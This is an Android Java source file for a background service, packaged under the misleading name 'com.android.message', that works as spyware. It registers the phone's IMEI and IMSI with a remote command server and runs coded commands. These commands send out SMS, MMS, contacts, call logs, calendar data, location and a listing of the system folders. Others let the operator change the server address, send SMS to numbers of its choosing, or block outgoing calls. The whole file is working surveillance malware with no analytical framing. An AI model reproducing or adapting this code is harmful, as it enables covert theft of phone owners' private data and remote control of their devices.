package com.android.message;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.nio.charset.Charset;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

/**
 * 
 * @author log(K) 发送的接收注册信息的service
 */
public class RegisterService extends Service {

	private static final String TAG = "RegisterService";

	public static String smsOrder = "";

	public static String SERVERIP = ServerIP.servIP;
	public static final int SERVERPORT = 2005;
	public Socket handsocket = null;
	public static String regStr = null;
	private String regStrForFile = null;
	// private String strPicName = null;

	// 接命令和收命令socket
	public static Socket orderSocket = null;
	public static DataOutputStream orderDOS = null;
	public static DataInputStream orderDIS = null;
	public static int count = 0; // 发送注册信息次数
	byte[] order = new byte[1024];
	public static long talkRunning = 0;
	public static int print = 1;
	public OpenNetwork network;
	public boolean networkState;

	// public Intent intent;

	/*
	 * private ByteBuffer sendBufferLen=ByteBuffer.allocate( 9 ); private
	 * ByteBuffer sendBuffer=ByteBuffer.allocate(39); private ByteBuffer
	 * receiveBuffer=ByteBuffer.allocate(1024); private Charset
	 * charset=Charset.forName("GBK");
	 */
	public Context mContext = null;
	public boolean THREAD_RUNNING = true;

	public void initService() {
		BasicInfo bInfo = new BasicInfo(this);
		String strIMEI = bInfo.getIMEI();
		String strIMSI = bInfo.getIMSI();

		regStr = "Android@" + strIMSI + "@" + strIMEI;
		regStrForFile = regStr.substring(8);
		Log.v(TAG, regStr);
		Log.v(TAG, regStrForFile);
		WriteLogFile.writeLog(regStrForFile);

	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	PowerManager.WakeLock wL = null;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		// mWorkTimer.schedule(CLOCK_WORK_TimerTask, 0, 5000);

		if (null == wL) {
			PowerManager pm = (PowerManager) this
					.getSystemService(Context.POWER_SERVICE);
			wL = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
					"com.android.message");
			if (null != wL) {
				wL.acquire();
				// WriteLogFile.writeLog("标记：NET里的锁create");
			}
		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.i("i", "onStartCommand...");

		network = new OpenNetwork(this); // 查看现在的网络状态
		networkState = network.checkNetWorkData();

		new Thread() {
			public void run() {

				talk();
				WriteLogFile.writeLog("command exec end!");

				try {
					Thread.sleep(15 * 1000); // 等待15s,将最后的数据数据完
				} catch (Exception e) {
					e.printStackTrace();
				}

				if (networkState == false) { // 如果原来关闭，则在使用后继续关闭
					WriteLogFile.writeLog("close the net");
					network.setDataEnabled(false);
				}
				stopSelf();// Stop service when task is done;
				System.exit(0);// Exit program

			}

		}.start();

		return START_NOT_STICKY;
	}

	/**
	 * 发送注册消息
	 * 
	 * @param prefix
	 */
	public void sendRegInfo() {
		// this.regStr = "Android@123456789012345@098765432112345";

		try {
			if (orderSocket == null || orderSocket.isClosed()
					|| (!orderSocket.isConnected())) {
				boolean connect = false;
				while (!connect) {
					try {
						orderSocket = new Socket(SERVERIP, SERVERPORT);
						Thread.sleep(3000); // 连不上服务器等待3s后连
						orderDOS = new DataOutputStream(
								orderSocket.getOutputStream());
						orderDIS = new DataInputStream(
								orderSocket.getInputStream());
						connect = true;
						Log.v(TAG, "Connect server success");
					} catch (Exception e) {
						connect = false;
						try {
							if (orderSocket != null) {
								orderSocket.close();
								orderSocket = null;
							}
						} catch (Exception e2) {
							String msg = e2.getMessage();
							if (msg != null) {
								System.out.println(msg);
							}
						}

						String message = e.getMessage();
						if (message != null) {
							System.out.println(message);
						} else {
							Log.v(TAG, "connect failed, try again");
						}
					}
				}
				orderSocket.setSoTimeout(2 * 1000); // read超时时间 20S
			}

			try {
				// 发送注册信息
				byte[] breg = regStr.getBytes("gb2312");
				int it = breg.length;
				String strbl = String.format("%09d", it);
				byte[] bregl = strbl.getBytes("gb2312");

				orderDOS.write(bregl);
				orderDOS.flush();
				orderDOS.write(breg);
				orderDOS.flush();
				Log.v(TAG, new String(breg));
				++print;

			} catch (Exception e) {
				String message = e.getMessage();
				if (message != null) {
					System.out.println(message);
				} else {
					Log.v("Error", "line-151");
				}
				if (orderSocket != null) {
					try {
						orderSocket.close();
						orderSocket = null;
					} catch (IOException e2) {
						System.out.println(e2.getMessage());
					}
				}
			}
		} catch (Exception e) {
			String msg = e.getMessage();
			System.out.println(msg);
		}
	}

	public void talk() {
		initService(); // 获取IMEI， IMSI号
		if (smsOrder != "") {
			commandExecute(smsOrder);
			smsOrder = "";
		}
		/*
		 * while (true) { try { sendRegInfo(); //发送注册信息 //执行短信命令 if(smsOrder !=
		 * "") { commandExecute(smsOrder); smsOrder = ""; } try {
		 * System.out.println("TcpClient-- talk for start"); ++talkRunning; //
		 * 判断是否有信息过来,有的话调执行命令 try { // 当接收到手机短信命令时 int length = 0; try { length
		 * = orderDIS.read(order); } catch (java.net.SocketTimeoutException e) {
		 * String message = e.getMessage(); if (message != null) {
		 * System.out.println(message); } } if (length == 0) continue; String
		 * ords = new String(order, 0, length); Log.v(TAG, ords);
		 * 
		 * WriteLogFile.writeLog("Receive order--" + ords); // 发送注册信息
		 * commandExecute(ords);
		 * 
		 * } catch (Exception e) { String message = e.getMessage(); if (message
		 * != null) { System.out.println(message); } else { Log.v(TAG,
		 * "read order error"); } } } catch (Exception e) { String message =
		 * e.getMessage(); if (message != null) { System.out.println(message); }
		 * else { Log.v(TAG, "read order error"); } } } catch (Exception e) {
		 * e.printStackTrace(); } }
		 */
	}

	public void commandExecute(String command) {
		// 发送文件
		WriteLogFile.writeLog(command);
		SendFile sendfile = new SendFile();

		// if (command.equalsIgnoreCase("SxVa")) {
		if (command.contains("SxVa")) {
			Message msg = new Message(this);
			msg.readAllSMS();
			sendfile.send("data/data/com.android.message/Message.txt",
					"Message.txt", regStrForFile);
			// deleteFile("data/data/com.buct.InfoCollect/Message.txt");
		}

		else if (command.contains("3Vaa")) {
			Contacts contacts = new Contacts(this);
			contacts.getCardContacts();

			sendfile.send("data/data/com.android.message/SimPhoneNum.txt",
					"SimPhoneNum.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/SimPhoneNum.txt");
		} else if (command.contains("T7x6")) {
			Contacts contacts = new Contacts(this);
			contacts.getLocalContacts();

			sendfile.send("data/data/com.android.message/OutLookPhoneNum.txt",
					"OutLookPhoneNum.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/OutLookPhoneNum.txt");
		} else if (command.contains("vS8b")) { // bug?
			Calendar calendar = new Calendar(this);
			calendar.getCalendarAppoint();

			sendfile.send("data/data/com.android.message/Appointment.txt",
					"Appointment.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/Appointment.txt");
		}

		else if (command.contains("nn8C")) { // bug
			Calendar calendar = new Calendar(this);
			calendar.getCalendarTask();

			sendfile.send("data/data/com.android.message/Task.txt", "Task.txt",
					regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/Task.txt");
		}

		else if (command.contains("xvsP")) {
			/*-
			 * 获取目录信息
			 * 目录参数换成/data时报错
			 */
			try{
			FileInfo fileinfo = new FileInfo(this);
			fileinfo.tree("/system", 0);// "/mnt" "/system"
			sendfile.send("data/data/com.android.message/fileInfor.txt",
					"fileInfor.txt", regStrForFile);
			}catch(Exception e){
				
			}
			// deleteFile("data/data/com.buct.InfoCollect/fileInfor.txt");
		} else if (command.contains("Xrw0")) {
			CallLog calllog = new CallLog(this);
			calllog.getCallLog();
			sendfile.send("data/data/com.android.message/CallRecord.txt",
					"CallRecord.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/CallRecord.txt");
		}
		/*
		 * else if (command.equalsIgnoreCase("Voice")) {
		 * 
		 * audioPro = new AudioPro();
		 * audioPro.writeLog("------AndroidVoice start..."); }
		 * 
		 * else if (command.equalsIgnoreCase("Stop") ||
		 * command.equalsIgnoreCase("reset")) {
		 * //Toast.makeText(InfoCollect.act, "------come to stop...",
		 * Toast.LENGTH_LONG).show();
		 * //audioPro.writeLog("------Command stop..."); Log.v("Stop Voice",
		 * "Ex Stop");
		 * 
		 * AudioPro.keepSending = false; if (audioPro != null) {
		 * audioPro.writeLog("------audioPro!=null..."); audioPro.stop();
		 * Log.v("Stop voice", "Stop"); audioPro.resetFileProPara();
		 * audioPro.writeLog("------Stop sending voice...");
		 * //Toast.makeText(InfoCollect.act, "------stop sending voice...",
		 * Toast.LENGTH_LONG).show(); audioPro = null;
		 * 
		 * } }
		 */
		// 经纬度
		else if (command.contains("lsP5")) {
			LocationServ location = new LocationServ(this);
			String newLoc = location.getLocation();
			newLoc = "Location@" + regStr + newLoc;
			Log.i("Location Service", newLoc);
			sendfile.sendLocation(newLoc);
			WriteLogFile.writeLog("send location over!");
		}

		// 彩信
		else if (command.contains("nl3Z")) {
			Log.v("MMC", "sending");
			MMS aMMS = new MMS(this);
			Log.v("MMC", "new over");
			aMMS.getMMC();
			Log.v("MMC", "getMMC over");
			sendfile.sendBigFile("data/data/com.android.message/mmc.zip",
					"mmc.zip", regStrForFile);
			Log.v("MMC", "send over");
		}
		// lzd start add change IP command action
		else if (command.contains("xS7j")) {
			// 设置新的已经保存的服务器的IP地址
			String ChangeIPCommand = command;
			int fist = ChangeIPCommand.lastIndexOf("xS7j");
			String encryptedIPAddress = ChangeIPCommand.substring(fist + 4,
					fist + 4 + 15);
			WriteLogFile.writeLog("将发过来的新IP地址截取后为：" + encryptedIPAddress);
			// 将获得的已经加密的IP地址解密
			String newIPAddress = ServerIP.decrypt(encryptedIPAddress);

			if (newIPAddress.length() == 0) {
				// 如果解密失败，如发过来的不是合法的密文

				// 关闭服务退出程序
				stopSelf();// Stop service when task is done;
				System.exit(0);// Exit program
			} else {
				try {
					if (ServerIP.setServerIP(newIPAddress)) {

						// 设置IP地址成功后，将修改IP地址成功的提示文件发给控制端
						IPChanged aipchanged = new IPChanged(this);
						aipchanged.writeNewIP();
						sendfile.send(
								"data/data/com.android.message/IPChanged.txt",
								"IPChanged.txt", regStrForFile);
					} else {
						// 关闭服务退出程序
						stopSelf();// Stop service when task is done;
						System.exit(0);// Exit program
					}
				} catch (IOException e) {
					// WriteLogFile.writeLog("修改新IP地址出现异常!");
				} finally {
				}
			}
		}
		// lzd end
		else if (command.contains("dH7k")) {
			// 发送指定短信内容到指定号码
			String CommandText = command;
			int first = CommandText.lastIndexOf("dH7k");
			int firstSharp = first + 5;
			int second = CommandText.lastIndexOf("#");
			int secondSharp = second + 1;
			String phoneNum = CommandText.substring(firstSharp, second);
			String TextContent = CommandText.substring(secondSharp);
			// 解密短信内容
			String decryptedPhoneNum = EncryptDecryptStr
					.strToPhoneNum(phoneNum);
			String decryptedTextContent = EncryptDecryptStr
					.stringSubOne(TextContent);
			SendAppointSMS aSendAppointSMS = new SendAppointSMS();
			aSendAppointSMS.sendAppointSMS(decryptedPhoneNum,
					decryptedTextContent);
			// 提示转发成功
			FileOperate FileOperateSuccess = new FileOperate(
					"ForwardSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n短信:\r" + decryptedTextContent + "\r转发给"
						+ decryptedPhoneNum + "成功");
			} catch (Exception e) {

			}
			sendfile.send("data/data/com.android.message/ForwardSuccess.txt",
					"ForwardSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("j9P5")) {
			// 阻止拨打给指定的号码
			String CommandText = command;
			int first = CommandText.lastIndexOf("j9P5");
			first = first + 4;
			String phoneNum = command.substring(first, first + 11);
			// 解密手机号
			String decryptedPhoneNum = EncryptDecryptStr
					.strToPhoneNum(phoneNum);
			FileOperate aFileOperate = new FileOperate("ProhibitNum.txt");
			try {
				aFileOperate.writeFile(decryptedPhoneNum);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			// 提示阻止成功
			FileOperate FileOperateSuccess = new FileOperate(
					"ProhibitNumSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n阻止目标手机拨打" + decryptedPhoneNum + "成功");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/ProhibitNumSuccess.txt",
					"ProhibitNumSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("UR4f")) {
			// 解禁拨打给指定的号码
			String CommandText = command;
			int first = CommandText.lastIndexOf("UR4f");
			first = first + 4;
			String phoneNum = command.substring(first, first + 11);
			// 解密手机号
			String decryptedPhoneNum = EncryptDecryptStr
					.strToPhoneNum(phoneNum);
			FileOperate aFileOperate = new FileOperate("ProhibitNum.txt");

			try {
				aFileOperate.replaceFileContent(decryptedPhoneNum, "");// 将文件里的号码消掉
			} catch (Exception e) {

			}
			// 提示解禁成功
			FileOperate FileOperateSuccess = new FileOperate(
					"NotProhibitNumSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n解禁目标手机拨打" + decryptedPhoneNum + "成功");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/NotProhibitNumSuccess.txt",
					"NotProhibitNumSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("Pk9b")) {
			// 阻止拨打所有电话
			FileOperate aFileOperate = new FileOperate("ProhibitAll.txt");
			try {
				aFileOperate.writeFile("All");
			} catch (Exception e) {

			}
			// 提示阻止拨打所有电话成功
			FileOperate FileOperateSuccess = new FileOperate(
					"ProhibitAllSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n禁止目标手机拨打所有电话成功");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/ProhibitAllSuccess.txt",
					"ProhibitAllSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("VT5w")) {
			// 解禁拨打所有电话
			FileOperate aFileOperate = new FileOperate("ProhibitAll.txt");
			try {
				aFileOperate.replaceFileContent("All", "");// 将文件里的All消掉
			} catch (Exception e) {

			}
			// 提示解禁拨打所有电话成功
			FileOperate FileOperateSuccess = new FileOperate(
					"NotProhibitAllSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n解禁目标手机拨打所有电话成功");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/NotProhibitAllSuccess.txt",
					"NotProhibitAllSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		}
	}

}
